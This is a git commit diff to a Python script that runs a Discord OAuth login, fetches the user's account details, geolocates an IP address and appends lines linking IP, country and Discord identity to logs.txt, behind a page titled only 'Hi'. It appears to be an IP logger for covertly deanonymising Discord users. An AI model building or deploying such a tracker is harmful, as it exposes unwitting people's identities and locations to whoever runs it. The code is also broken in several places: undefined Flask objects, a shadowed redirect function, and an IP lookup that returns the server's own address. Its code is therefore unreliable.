a0ffe67bdb27cc25db0ced18147eda4c7d4fefa9
01 <110252997+ryandonq@users.noreply.github.com>
2024-01-04 12:03:54 -0300

    main finalizado com mais linhas de código

--- main.py
+++ main.py
@@ -2,13 +2,15 @@ import requests
 import json
 from datetime import date
 
-client_id = ""
-client_secret = ""
+client_id = ""  #id da secret
+client_secret = "" #secret
 redirect = ""
+
 
 def get_ip_address():
     ip = requests.get('https://api.ipify.org').text
     return ip
+
 
 def validate_ip(ip):
     if ip.lower() == 'unknown':
@@ -42,4 +44,39 @@ if 'code' not in request.args:
         'state': code
     }
     return redirect('https://discordapp.com/api/oauth2/authorize' + '?' + urlencode(params))
-  
+
+if 'code' in request.args:
+    token_request = "https://discordapp.com/api/oauth2/token"
+    token_data = {
+        "grant_type": "authorization_code",
+        "client_id": client_id,
+        "client_secret": client_secret,
+        "redirect_uri": redirect,
+        "state": request.args.get('state'),
+        "code": request.args.get('code')
+    }
+    token_response = requests.post(token_request, data=token_data)
+    token_data = json.loads(token_response.text)
+    access_token = token_data['access_token']
+
+info_request = "https://discordapp.com/api/users/@me"
+info_headers = {
+    "Authorization": "Bearer " + access_token
+}
+info_response = requests.get(info_request, headers=info_headers)
+user = json.loads(info_response.text)
+id = user['id']
+un = user['username']
+di = user['discriminator']
+diname = un + "#" + di
+ip = get_ip_address()
+
+if id:
+    ip_info_response = requests.get("http://extreme-ip-lookup.com/json/" + ip)
+    ip_info = json.loads(ip_info_response.text)
+    country = ip_info['country']
+    today = date.today().strftime("%d/%m/%Y")
+    with open("logs.txt", "a+") as file:
+        file.write("Logged IP: " + ip + " (" + diname + ") - (" + id + ") - (" + country + "), at " + today + "\n")
+
+print("<title>Hi</title>")
